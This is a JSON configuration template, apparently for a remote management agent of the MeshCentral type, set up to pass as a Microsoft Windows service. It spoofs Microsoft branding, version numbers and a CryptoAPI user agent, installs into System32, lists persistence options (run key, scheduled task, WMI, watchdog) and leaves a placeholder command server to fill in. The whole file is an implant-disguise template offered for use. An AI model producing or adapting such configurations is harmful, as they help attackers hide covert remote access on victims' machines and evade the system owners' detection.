{
  "$schema": "./schema/meshagent.schema.json",
  "_comment": "TEMPLATE FILE - Copy to branding_config.json and customize with your infrastructure",
  "branding": {
    "companyName": "Microsoft Corporation",
    "serviceName": "WinDiagnosticHost",
    "displayName": "Windows Diagnostic Host Service",
    "binaryName": "diaghost.exe",
    "productName": "Windows Diagnostic Host",
    "description": "system health monitoring",
    "installRoot": "C:/Windows/System32/DiagnosticHost",
    "logPath": "C:/Windows/System32/DiagnosticHost/logs",
    "versionInfo": {
      "fileVersion": "10.0.19041.0",
      "productVersion": "10.0.19041.0"
    }
  },
  "network": {
    "primaryEndpoint": "wss://YOUR_DOMAIN_HERE:443/agent.ashx",
    "sni": null,
    "hostHeader": null,
    "alpn": ["http/1.1"],
    "userAgent": "Microsoft-CryptoAPI/10.0"
  },
  "artifacts": {
    "databaseName": "diaghost.db",
    "logFileName": "diagnostics.log",
    "configFileName": "diaghost.conf"
  },
  "persistence": {
    "runKey": false,
    "scheduledTask": { "enabled": false },
    "wmi": { "enabled": false },
    "watchdog": { "enabled": true, "intervalSeconds": 600 }
  },
  "provisioning": {
    "meshName": "Windows Diagnostics",
    "meshType": "2",
    "meshId": "",
    "serverId": "",
    "serverUrl": "wss://YOUR_DOMAIN_HERE:443/agent.ashx"
  }
}
